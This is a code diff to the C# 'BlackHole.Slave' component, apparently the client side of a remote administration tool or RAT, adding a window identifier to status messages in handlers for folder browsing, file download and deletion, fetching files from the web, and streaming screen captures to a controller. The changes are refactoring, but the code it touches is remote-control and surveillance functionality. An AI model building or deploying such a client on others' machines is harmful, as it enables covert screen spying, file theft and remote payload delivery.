@@ -108,8 +108,11 @@ namespace BlackHole.Slave
         private void SetDisconnected()
         {
             m_connected = false;
-            m_capturing = false;
-            m_screenCaptureTokenSource.Cancel();
+            if (m_capturing)
+            {
+                m_capturing = false;
+                m_screenCaptureTokenSource.Cancel();
+            }
             ClearSendQueue();
         }
 
@@ -144,8 +147,8 @@ namespace BlackHole.Slave
             UpdateLastReceived();
             SetConnected();
 
-            var frames = m_client.ReceiveMultipartMessage();            
-            var message = NetMessage.Deserialize(frames.Last.Buffer);
+            var frames = m_client.ReceiveMultipartMessage();
+            var message = NetMessage.Deserialize(frames[0].Buffer);
             message.Match()
                 .With<DoYourDutyMessage>(DoYourDuty)
                 .With<PingMessage>(Ping)
@@ -157,7 +160,7 @@ namespace BlackHole.Slave
                 .With<StopScreenCaptureMessage>(StopScreenCapture)
                 .Default(m =>
                 {
-                    SendFailedStatus("Message parsing", $"Unknow message {m.GetType().Name}");
+                    SendFailedStatus(message.WindowId, "Message parsing", $"Unknow message {m.GetType().Name}");
                 });
         }
 
@@ -167,28 +170,28 @@ namespace BlackHole.Slave
         /// </summary>
         /// <param name="operation"></param>
         /// <param name="message"></param>
-        private void SendStatus(long operationId, string operation, Exception exception) => SendStatus(operationId, operation, false, "Failed : " +  exception.ToString());
+        private void SendStatus(int windowId, long operationId, string operation, Exception exception) => SendStatus(windowId, operationId, operation, false, "Failed : " +  exception.ToString());
 
         /// <summary>
         /// 
         /// </summary>
         /// <param name="operation"></param>
         /// <param name="message"></param>
-        private void SendStatus(long operationId, string operation, string message) => SendStatus(operationId, operation, true, message);
+        private void SendStatus(int windowId, long operationId, string operation, string message) => SendStatus(windowId, operationId, operation, true, message);
 
         /// <summary>
         /// 
         /// </summary>
         /// <param name="operation"></param>
         /// <param name="message"></param>
-        private void SendStatus(string operation, string message) => SendStatus(-1, operation, message);
+        private void SendStatus(int windowId, string operation, string message) => SendStatus(windowId, -1, operation, message);
 
         /// <summary>
         /// 
         /// </summary>
         /// <param name="operation"></param>
         /// <param name="message"></param>
-        private void SendFailedStatus(string operation, string message) => SendStatus(-1, operation, false, "Failed : " + message);
+        private void SendFailedStatus(int windowId, string operation, string message) => SendStatus(windowId, -1, operation, false, "Failed : " + message);
 
         /// <summary>
         /// 
@@ -196,10 +199,11 @@ namespace BlackHole.Slave
         /// <param name="operation"></param>
         /// <param name="success"></param>
         /// <param name="message"></param>
-        private void SendStatus(long operationId, string operation, bool success, string message)
+        private void SendStatus(int windowId, long operationId, string operation, bool success, string message)
         {
             Send(new StatusUpdateMessage()
             {
+                WindowId = windowId,
                 OperationId = operationId,
                 Operation = operation,
                 Success = success,
@@ -231,10 +235,10 @@ namespace BlackHole.Slave
         /// <param name="operationName"></param>
         /// <param name="operation"></param>
         /// <param name="messageBuilder"></param>
-        private void ExecuteSimpleOperation<T>(string operationName, Func<T> operation, Func<T, string> messageBuilder) where T : NetMessage
+        private void ExecuteSimpleOperation<T>(int windowId, string operationName, Func<T> operation, Func<T, string> messageBuilder) where T : NetMessage
             => ExecuteComplexSendOperation(-1, operationName, operation, (message) =>
             {
-                SendStatus(-1, operationName, "Success : " + messageBuilder(message));
+                SendStatus(windowId, -1, operationName, "Success : " + messageBuilder(message));
             });
 
         /// <summary>
@@ -244,8 +248,8 @@ namespace BlackHole.Slave
         /// <param name="operationName"></param>
         /// <param name="operation"></param>
         /// <param name="success"></param>
-        private void ExecuteComplexSendOperation<T>(string operationName, Func<T> operation) where T : NetMessage
-            => ExecuteComplexSendOperation(operationName, operation, (x) => { });
+        private void ExecuteComplexSendOperation<T>(int windowId, string operationName, Func<T> operation) where T : NetMessage
+            => ExecuteComplexSendOperation(windowId, operationName, operation, (x) => { });
 
         /// <summary>
         /// 
@@ -254,8 +258,8 @@ namespace BlackHole.Slave
         /// <param name="operationName"></param>
         /// <param name="operation"></param>
         /// <param name="success"></param>
-        private void ExecuteComplexSendOperation<T>(string operationName, Func<T> operation, Action<T> success) where T : NetMessage
-            => ExecuteComplexSendOperation(-1, operationName, operation, success);
+        private void ExecuteComplexSendOperation<T>(int windowId, string operationName, Func<T> operation, Action<T> success) where T : NetMessage
+            => ExecuteComplexSendOperation(windowId, -1, operationName, operation, success);
 
         /// <summary>
         /// 
@@ -264,12 +268,12 @@ namespace BlackHole.Slave
         /// <param name="operationName"></param>
         /// <param name="operation"></param>
         /// <param name="success"></param>
-        private void ExecuteComplexSendOperation<T>(long operationId, string operationName, Func<T> operation, Action<T> success) where T : NetMessage
+        private void ExecuteComplexSendOperation<T>(int windowId, long operationId, string operationName, Func<T> operation, Action<T> success) where T : NetMessage
             => Utility.ExecuteComplexOperation(operation, (message) =>
             {
                 Send(message);
                 success(message);
-            }, (e) => SendStatus(operationId, operationName, e));
+            }, (e) => SendStatus(windowId, operationId, operationName, e));
 
 
         /// <summary>
@@ -278,9 +282,9 @@ namespace BlackHole.Slave
         /// <param name="message"></param>
         private void NavigateToFolder(NavigateToFolderMessage message)
         {
-            ExecuteSimpleOperation("Folder navigation", 
+            ExecuteSimpleOperation(message.WindowId, "Folder navigation", 
                 () => FileHelper.NavigateToFolder(message.Path), 
-                (nav) => $"{message.Path}");
+                (nav) => $"{nav.Path}");
         }
 
         /// <summary>
@@ -289,12 +293,12 @@ namespace BlackHole.Slave
         /// <param name="message"></param>
         private void DownloadFilePart(DownloadFilePartMessage message)
         {
-            ExecuteComplexSendOperation(message.Id, "File download",
+            ExecuteComplexSendOperation(message.WindowId, message.Id, "File download",
                 () => FileHelper.DownloadFilePart(message.Id, message.CurrentPart, message.Path),
                 (part) =>
                 {
                     if (part.CurrentPart == part.TotalPart)
-                        SendStatus(message.Id, "File download", "Successfully downloaded : " + part.Path);
+                        SendStatus(message.WindowId, message.Id, "File download", "Successfully downloaded : " + part.Path);
                 });
         }
 
@@ -325,7 +329,7 @@ namespace BlackHole.Slave
                 {
                     if (e.Error != null)
                     {
-                        SendStatus(message.Id, "File upload (downloading from web)", e.Error);
+                        SendStatus(message.WindowId, message.Id, "File upload (downloading from web)", e.Error);
                     }
                     else
                     {
@@ -344,7 +348,7 @@ namespace BlackHole.Slave
             }
             catch(Exception e)
             {
-                SendStatus(message.Id, "File upload (downloading from web)", e);
+                SendStatus(message.WindowId, message.Id, "File upload (downloading from web)", e);
             }
         }
 
@@ -354,7 +358,7 @@ namespace BlackHole.Slave
         /// <param name="message"></param>
         private void DeleteFile(DeleteFileMessage message)
         {
-            ExecuteSimpleOperation("File deletion",
+            ExecuteSimpleOperation(message.WindowId, "File deletion",
                 () => FileHelper.DeleteFile(message.FilePath),
                 (deletion) => $"{deletion.FilePath}");
         }
@@ -369,7 +373,7 @@ namespace BlackHole.Slave
                 return; // dont start multiple tasks
             m_screenCaptureTokenSource = new CancellationTokenSource();
 
-            SendStatus("Screen capture", "Started capturing...");
+            SendStatus(message.WindowId, "Screen capture", "Started capturing...");
             Task.Factory.StartNew(() => SendCapture(message), m_screenCaptureTokenSource.Token);
         }
 
@@ -382,7 +386,7 @@ namespace BlackHole.Slave
             m_capturing = true;
             try
             {
-                ExecuteComplexSendOperation(
+                ExecuteComplexSendOperation(message.WindowId,
                     "Screen capture",
                     () => RemoteDesktopHelper.CaptureScreen(message.ScreenNumber, message.Quality));
 
@@ -398,7 +402,7 @@ namespace BlackHole.Slave
             {
                 // cancelled
                 m_capturing = false;
-                SendStatus("Screen capture", "Stopped capturing...");
+                SendStatus(message.WindowId, "Screen capture", "Stopped capturing...");
             }
         }
 
